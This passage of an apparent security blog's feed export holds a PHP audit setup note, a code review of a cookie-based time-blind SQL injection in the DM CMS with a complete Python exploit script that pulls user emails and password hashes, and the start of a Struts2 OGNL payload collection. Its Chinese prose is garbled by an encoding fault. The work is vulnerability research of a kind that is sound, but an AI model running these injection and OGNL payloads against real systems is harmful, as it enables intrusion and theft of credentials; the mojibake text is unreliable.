attackç¬¬ä¸€ä¸ªå­—ç¬¦æ²¡åŠæ³•è·‘å‡ºæ¥ï¼Œç”±äºæœ€åä¸€ä¸ªå­—ç¬¦è§£å‡ºæ¥æ˜¯ç©ºç™½æ‰€ä»¥è¿˜æ˜¯errorï¼Œä¸è¿‡æ²¡å…³ç³»æš´åŠ›ä¸€éå°±å¥½äº†ï¼ˆpsï¼šæœ‰äº†åŸç†ï¼Œå†™ä»£ç å¾ˆå®¹æ˜“ï¼Œå°±ä¸æ”¾ä»£ç äº†ï¼‰</li></ol><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ¬ ç¼ºçš„è¿˜æ˜¯å¾ˆå¤šï¼Œç»§ç»­ğŸ’ª</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;è¾èŒåæ²¡äº‹æƒ…å¹²ï¼Œåˆšå¥½èµ¶ä¸Šnjctfï¼Œè¿˜æ˜¯ä¸€æ ·èœå•Šï¼Œåªåšäº†7é“é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›ğŸ’ªï¼ˆps:æ¯•ä¸šè®¾è®¡ä»€ä¹ˆé¬¼å•Šï¼‰å†™ä¸€ä¸‹webçš„writeupï¼Œç”±äºé¢˜ç›®è¿˜å¼€ç€ï¼ŒæŠŠæ²¡åšå‡ºæ¥çš„åšä¸€éï¼Œçºªå½•ä¸€ä¸‹æˆ‘è§‰å¾—æœ‰å¿…è¦è®°çš„é¢˜&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://blog.0kami.cn/categories/ctf/"/>
    
    
      <category term="njctf" scheme="http://blog.0kami.cn/tags/njctf/"/>
    
  </entry>
  
  <entry>
    <title>ã€OTHERSã€‘phpä»£ç å®¡è®¡å‰çš„å‡†å¤‡</title>
    <link href="http://blog.0kami.cn/2017/02/03/old-code-review-pre-prepare/"/>
    <id>http://blog.0kami.cn/2017/02/03/old-code-review-pre-prepare/</id>
    <published>2017-02-03T05:00:57.000Z</published>
    <updated>2018-01-25T07:36:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>æ‰€è°“â€œå·¥æ¬²å–„å…¶äº‹,å¿…å…ˆåˆ©å…¶å™¨â€ï¼Œåœ¨ä»£ç å®¡è®¡å‰ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡æé«˜æˆ‘ä»¬å®¡è®¡æ•ˆç‡çš„å·¥å…·ã€‚</p><a id="more"></a><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><ol><li>Mac</li><li>xampp(å¯ä»¥ç”¨phpstudyæˆ–è€…æ˜¯å…¶ä»–é›†æˆç¯å¢ƒä»£æ›¿)</li><li>Navicat Premium(ä¸ªäººè®¤ä¸ºMacä¸‹æœ€å¥½çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œå­¦ç”Ÿå…šåªèƒ½ç”¨**,æœ‰èƒ½åŠ›å°½é‡æ”¯æŒæ­£ç‰ˆ)</li><li>phpstorm(è¿™é‡Œçš„IDEç”¨çš„æ˜¯æˆ‘è‡ªå·±æ¯”è¾ƒä¹ æƒ¯çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ æ¯”è¾ƒç†Ÿæ‚‰çš„)</li><li>xdebug(ç”¨æ¥åŠ¨æ€è°ƒè¯•)</li><li>ç»ˆç«¯</li><li>æµè§ˆå™¨(firefoxã€chrome,è¿™é‡Œä½¿ç”¨firefox,hackbaræ˜¯ä¸ªå¥½ä¸œè¥¿)</li></ol><p>å®‰è£…ä¸Šè¿°çš„è½¯ä»¶ä¹‹ç±»çš„å°±ä¸è¯´äº†ï¼Œä¸‹æ–‡ä¸»è¦æ˜¯åŠ¨æ€è°ƒè¯•ç¯å¢ƒæ­å»ºã€‚</p><h1 id="åŠ¨æ€è°ƒè¯•ç¯å¢ƒ"><a href="#åŠ¨æ€è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="åŠ¨æ€è°ƒè¯•ç¯å¢ƒ"></a>åŠ¨æ€è°ƒè¯•ç¯å¢ƒ</h1><h2 id="phpæ·»åŠ xdebugé…ç½®"><a href="#phpæ·»åŠ xdebugé…ç½®" class="headerlink" title="phpæ·»åŠ xdebugé…ç½®"></a>phpæ·»åŠ xdebugé…ç½®</h2><p>xamppçš„php.iniä½äº<code>/install/path/etc/php.ini</code>ï¼Œåœ¨é…ç½®æ–‡ä»¶æœ€åæ·»åŠ ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_enable=on</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_mode=&quot;req&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_host=localhost/127.0.0.1</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>soæ–‡ä»¶æ˜¯xamppè‡ªå¸¦çš„ï¼Œmacä¸‹çš„é…ç½®å¯ä»¥ç›´æ¥copyæˆ‘çš„<br>ä¿å­˜åé‡å¯apache</p><h2 id="firefoxå®‰è£…xdebugæ‰©å±•"><a href="#firefoxå®‰è£…xdebugæ‰©å±•" class="headerlink" title="firefoxå®‰è£…xdebugæ‰©å±•"></a>firefoxå®‰è£…xdebugæ‰©å±•</h2><p>firefoxä¸‹çš„xdebugæ‰©å±•å« the easiest xdebugï¼Œæœç´¢ä¸€ä¸‹å®‰è£…<br>å®‰è£…å®Œæˆåç‚¹äº®å·¥å…·æ ä¸Šçš„ç”²è™«ï¼Œå¼€å¯è°ƒè¯•<br><img src="../../../../img/pre_code_review/bug.png" alt=""><br>è®¾ç½®key,æ›´phpé…ç½®æ–‡ä»¶ä¸­ç›¸åŒ<br><img src="../../../../img/pre_code_review/bug2.png" alt=""></p><h2 id="é…ç½®phpstorm"><a href="#é…ç½®phpstorm" class="headerlink" title="é…ç½®phpstorm"></a>é…ç½®phpstorm</h2><p>æ‰“å¼€Preferences-&gt;Languages&amp;Framework-&gt;php<br><img src="../../../../img/pre_code_review/step1.png" alt=""><br>å¦‚å›¾è®¾ç½®serversï¼Œæ¥ç€è®¾ç½®debugä¸‹çš„DBGp Proxy<br><img src="../../../../img/pre_code_review/step2.png" alt=""><br>è®¾ç½®å®Œæˆååœ¨å·¥å…·æ å¤„æ‰¾åˆ°edit Configurations<br><img src="../../../../img/pre_code_review/step3.png" alt=""><br>æ–°å¢php web application<br><img src="../../../../img/pre_code_review/step4.png" alt=""><br>æ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„ä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•äº†</p><h1 id="mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§"><a href="#mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§" class="headerlink" title="mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§"></a>mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§</h1><p>åœ¨navicatæˆ–ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹2å¥</p><blockquote><p>set global general_log=on;<br>set global log_output=â€™tableâ€™;</p></blockquote><p>æŸ¥çœ‹mysql.general_logè¡¨å¯ä»¥çœ‹åˆ°è¿è¡Œè¿‡çš„sqlè¯­å¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬æŸ¥è¯¢<br>winä¸‹å¯ä»¥ç”¨seayçš„ä»£ç å®¡è®¡å·¥å…·ï¼Œå¸¦äº†mysqlçš„sqlç›‘æ§</p><h1 id="ç»ˆç«¯"><a href="#ç»ˆç«¯" class="headerlink" title="ç»ˆç«¯"></a>ç»ˆç«¯</h1><p>ç»ˆç«¯ä¸»è¦ç”¨åˆ°äº†grepè¿™ä¸ªå·¥å…·ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³çš„æ•™æã€‚<br>ä¸»è¦åŒ¹é…è¾“å…¥è¾“å‡ºç‚¹ï¼Œå±é™©å‡½æ•°ç­‰ç­‰<br>å…·ä½“çš„ä»¥åæœ‰ç©ºäº†å†è¡¥å……</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼Œä»¥åèƒ½çœ‹çœ‹ï¼Œæ„‰å¿«çš„ä»£ç å®¡è®¡å§:P</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;æ‰€è°“â€œå·¥æ¬²å–„å…¶äº‹,å¿…å…ˆåˆ©å…¶å™¨â€ï¼Œåœ¨ä»£ç å®¡è®¡å‰ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡æé«˜æˆ‘ä»¬å®¡è®¡æ•ˆç‡çš„å·¥å…·ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="others" scheme="http://blog.0kami.cn/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>ã€Code Reviewã€‘DMä¼ä¸šå»ºç«™ç³»ç»Ÿå‰å°ç›²æ³¨</title>
    <link href="http://blog.0kami.cn/2017/01/29/old-DM-sql-injection/"/>
    <id>http://blog.0kami.cn/2017/01/29/old-DM-sql-injection/</id>
    <published>2017-01-29T13:24:30.000Z</published>
    <updated>2018-01-25T07:18:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>ä»Šå¤©æäº†ä¸€ä¸‹åŠ¨æ€è°ƒè¯•çš„ä¸œè¥¿ï¼Œç„¶åé¡ºä¾¿çœ‹äº†çœ‹ä¸Šæ¬¡ä¸‹çš„<a href="http://www.demososo.com/down.html" target="_blank" rel="noopener">DMä¼ä¸šå»ºç«™ç³»ç»Ÿ2017.01.23</a>ã€‚</p><a id="more"></a><h1 id="å‰å°cookie-æ—¶é—´ç›²æ³¨"><a href="#å‰å°cookie-æ—¶é—´ç›²æ³¨" class="headerlink" title="å‰å°cookie æ—¶é—´ç›²æ³¨"></a>å‰å°cookie æ—¶é—´ç›²æ³¨</h1><p>å¤§è‡´è·Ÿäº†ä¸€ä¸‹å‡ ä¸ªå…¥å£æ–‡ä»¶ï¼Œè¯¥å¥—cmsä¸»è¦çš„å®‰å…¨æªæ–½ä¸º<code>htmlentities</code>ï¼Œåœ¨POST&amp;&amp;GETçš„è¾“å…¥ç‚¹åšäº†htmlå®ä½“åŒ–çš„æ“ä½œï¼Œä½†æ˜¯è¿™å¹¶ä¸è½¬ä¹‰å•å¼•å·ï¼ˆé»˜è®¤ä¸è½¬ä¹‰å•å¼•å·å…·ä½“å¯çœ‹<a href="http://www.php.net/manual/en/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a>ï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œæ¶‰åŠåˆ°å­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œéƒ½æ˜¯å•å¼•å·é—­åˆï¼Œé‚£ä¹ˆå¾ˆæ¸…æ¥šï¼Œåœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ—¶å®¹æ˜“äº§ç”Ÿsqlæ³¨å…¥æ¼æ´ã€‚<br>é‚£ä¹ˆæ¥ä¸‹æ¥ä¸»è¦æ‰¾ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æ“ä½œçš„ä½ç½®ã€‚</p><ol><li>POST&amp;&amp;GET</li><li>COOKIE </li></ol><p>psï¼šè¿™é‡Œå°±éšä¾¿æ‰¾äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå› ä¸ºè¿™å¥—ç³»ç»Ÿæ³¨å…¥ä¸è¦å¤ªå¤šï¼Œè¿åå°ç™»é™†éƒ½å¯ä»¥ :P</p><p>å‰é¢æåˆ°å¯¹POST&amp;&amp;GETåšäº†å®ä½“è½¬ä¹‰ï¼Œä½†æ˜¯grepæ‰¾äº†ä¸€ä¸‹cookieï¼Œå‘ç°å¹¶æ²¡æœ‰å¯¹cookieçš„å€¼è¿›è¡Œå®‰å…¨æ“ä½œï¼Œç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚<br>indexDM_load.php Line 108</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) </span><br><span class="line">    $curstyle = $_COOKIE[&quot;curstyle&quot;];</span><br><span class="line">else </span><br><span class="line">    $curstyle = $row[&apos;curstyle&apos;];</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; </span><br><span class="line"> //echo $sqlstyle;exit;</span><br><span class="line">if(getnum($sqlstyle)&gt;0)&#123;</span><br><span class="line">$rowstyle = getrow($sqlstyle);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸ºæ¼æ´çš„ä¸»è¦æˆå› ç‚¹ï¼Œå¦‚æœcookieä¸­å­˜åœ¨curstyle,ä¼˜å…ˆé€‰ç”¨cookieä¸­çš„å€¼ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ç”±äºæ²¡æœ‰æ‰¾åˆ°å…·ä½“å›æ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹å¼è·å–æ•°æ®ã€‚</p><p>å¸¦ä¸Šè‡ªå·±å†™çš„EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2017/1/30</span><br><span class="line"></span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">class CookieBlindSqlInjection:</span><br><span class="line"></span><br><span class="line">    def __init__(self,url):</span><br><span class="line">        self.url=url</span><br><span class="line">        self.len=0</span><br><span class="line"></span><br><span class="line">    def getLength(self,column,table):</span><br><span class="line">        payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        #first confirm bin-format data length</span><br><span class="line">        len=0</span><br><span class="line">        for i in range(1,9):</span><br><span class="line">            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            if flag==&quot;0&quot;:</span><br><span class="line">                len=i</span><br><span class="line">                break</span><br><span class="line">        res=&quot;&quot;</span><br><span class="line">        for i in range(1,len+1):</span><br><span class="line">            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            res+=flag</span><br><span class="line">            # print res</span><br><span class="line">        self.len=int(res,2)</span><br><span class="line">        pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len))</span><br><span class="line">        return int(res,2)</span><br><span class="line"></span><br><span class="line">    def getData(self,column,table):</span><br><span class="line">        payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        total_res=&quot;&quot;</span><br><span class="line">        for i in range(1,self.len+1):#å…·ä½“æ•°æ®çš„é•¿åº¦</span><br><span class="line">            len = 0</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                if flag == &quot;0&quot;:</span><br><span class="line">                    len = j</span><br><span class="line">                    break</span><br><span class="line">            # print &quot;len:&quot;+str(len)</span><br><span class="line">            res = &quot;&quot;</span><br><span class="line">            for k in range(1, len + 1):</span><br><span class="line">                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                res += flag</span><br><span class="line">                # print res</span><br><span class="line">            total_res+=chr(int(res,2))</span><br><span class="line">            pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res)</span><br><span class="line">        return total_res</span><br><span class="line"></span><br><span class="line">    def send(self,cookie):</span><br><span class="line">        headers=&#123;&quot;Cookie&quot;:cookie&#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(self.url, headers=headers,timeout=4)</span><br><span class="line">            return &quot;1&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">def pprint(flag,content):</span><br><span class="line">    print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \</span><br><span class="line">        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;)</span><br><span class="line">    pprint(&quot;*&quot;,&quot;program start&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;program done&quot;)</span><br></pre></td></tr></table></figure><p>ps:DMè¿™ä¸ªé¬¼ï¼Œä»£ç å†™çš„å¥½ä¹±å•ŠT_T</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;ä»Šå¤©æäº†ä¸€ä¸‹åŠ¨æ€è°ƒè¯•çš„ä¸œè¥¿ï¼Œç„¶åé¡ºä¾¿çœ‹äº†çœ‹ä¸Šæ¬¡ä¸‹çš„&lt;a href=&quot;http://www.demososo.com/down.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;DMä¼ä¸šå»ºç«™ç³»ç»Ÿ2017.01.23&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="codereview" scheme="http://blog.0kami.cn/categories/codereview/"/>
    
    
      <category term="cms" scheme="http://blog.0kami.cn/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘Struts2å‘½ä»¤æ‰§è¡Œå„ç‰ˆæœ¬è®°å½•</title>
    <link href="http://blog.0kami.cn/2017/01/13/old-Struts2-history-payload/"/>
    <id>http://blog.0kami.cn/2017/01/13/old-Struts2-history-payload/</id>
    <published>2017-01-13T08:57:47.000Z</published>
    <updated>2018-01-25T07:32:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>æœ€è¿‘åœ¨å†™Struts2çš„ä¸€äº›PoCï¼Œè®°å½•ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬çš„PoCæ–¹ä¾¿åˆ°æ—¶å€™æŸ¥é˜…ã€‚å…ˆæä¸€ä¸‹å‚è€ƒçš„å‰è¾ˆä»¬çš„ç½‘å€ï¼Œæ„Ÿè°¢ğŸ™</p><a id="more"></a><ul><li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-xxx" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-xxx</a></li><li><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-009</a></li></ul><h1 id="Struts2å‘½ä»¤æ‰§è¡Œé›†åˆ"><a href="#Struts2å‘½ä»¤æ‰§è¡Œé›†åˆ" class="headerlink" title="Struts2å‘½ä»¤æ‰§è¡Œé›†åˆ"></a>Struts2å‘½ä»¤æ‰§è¡Œé›†åˆ</h1><p>ä¸‹æ–‡ä¸æ˜¯å…·ä½“çš„åˆ†ææ–‡ï¼Œèƒ½åŠ›æœ‰é™ï¼Œä»…è®°å½•ä¸€ä¸‹ä»¥åšå°†æ¥å¤ä¹ æŸ¥ç”¨ã€‚<br>è¿‡æ®µæ—¶é—´ä¼šå°†æ‰€æœ‰çš„æ¼æ´ç¯å¢ƒä¸Šä¼ åˆ°githubä¸Šï¼Œç¯å¢ƒæ¥æºå¤§éƒ¨åˆ†ä¸ºæˆ‘å¶åƒ<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>åšå®¢ä¸Šå…±äº«çš„ä»¥åŠå®˜ç½‘ä¸Šä¸‹çš„å¯¹åº”ç‰ˆæœ¬çš„ç¤ºä¾‹ç¯å¢ƒã€‚<br>update:2017/1/16 <a href="https://github.com/0kami/Struts2Environment/" target="_blank" rel="noopener">ç¯å¢ƒåœ°å€</a></p><h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><pre><code>å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.0.8å…·ä½“è¯¦æƒ…ï¼šhttps://struts.apache.org/docs/s2-001.html</code></pre><blockquote><p>è¯¥æ¼æ´å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨ OGNL è¡¨è¾¾å¼ %{value} è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ä¾‹å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åç«¯ä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨ %{value} å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  Payload è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸Šæ–‡å¼•ç”¨<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>çš„æè¿°ã€‚</p><h3 id="æ„é€ PoC"><a href="#æ„é€ PoC" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–tomcatæ‰§è¡Œè·¯å¾„"><a href="#è·å–tomcatæ‰§è¡Œè·¯å¾„" class="headerlink" title="è·å–tomcatæ‰§è¡Œè·¯å¾„"></a>è·å–tomcatæ‰§è¡Œè·¯å¾„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–webæ ¹ç›®å½•"><a href="#è·å–webæ ¹ç›®å½•" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" 